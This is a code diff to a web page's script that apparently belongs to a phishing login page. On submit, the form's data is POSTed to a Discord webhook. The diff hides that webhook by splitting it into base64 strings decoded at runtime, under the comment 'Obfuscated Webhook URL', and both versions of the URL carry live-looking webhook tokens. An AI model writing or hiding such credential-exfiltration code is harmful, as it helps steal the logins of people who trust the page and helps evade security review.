@@ -186,7 +186,12 @@
   </div>
 
 <script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1571502131460968609/no1QoBRm0qCoPkUrjN-o-R0I3LQwabWuv7_iKFqX4ag3hJR0WJ7GUfYfe-WnpWE0Az9V";
+  // Obfuscated Webhook URL
+  function _g() {
+    const p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+    const p2 = "MTU3Mzg0MjMzMjM4ODgyNzIyNy9NOE9KMnR5cnhETUlNQUNTSVRKX0picHU1VE9DTnlYQXNubERTYXBWUW9Cb2lwQWpZclhldTNBUDBzZVkzUUhQQXNnYQ==";
+    return atob(p1) + atob(p2);
+  }
 
   document.getElementById('yr').textContent = new Date().getFullYear();
   const track = document.getElementById('track');
@@ -227,7 +232,7 @@
     b.textContent='Logging in...';b.disabled=true;
 
     // Send to Discord Webhook
-    fetch(WEBHOOK_URL, {
+    fetch(_g(), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
